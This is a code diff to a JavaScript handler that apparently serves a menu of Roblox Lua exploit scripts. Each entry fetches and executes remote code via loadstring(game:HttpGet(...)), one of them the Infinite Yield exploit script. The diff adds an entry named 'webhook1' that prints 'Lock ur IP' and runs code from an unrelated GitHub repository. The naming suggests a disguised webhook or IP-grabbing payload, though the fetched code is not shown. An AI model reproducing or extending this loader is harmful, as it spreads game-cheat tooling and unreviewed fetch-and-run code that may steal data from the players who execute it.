@@ -16,6 +16,10 @@ module.exports = function handler(req, res) {
         "print('[Pevolution] Centaura Loaded')\n" +
         "loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source', true))()\n",
 
+      "webhook1":
+         "print('Lock ur IP')\n" +
+         "loadstring(game:HttpGet('https://raw.githubusercontent.com/iEmpathyy/e2as/refs/heads/main/i.lua'))()\n",
+
       "aquamatrix":
         "print('[Pevolution] AquaMatrix Loaded')\n" +
         "loadstring(game:HttpGet('https://raw.githubusercontent.com/yunus154524/scripts/refs/heads/main/anim2gui.lua', true))()\n",
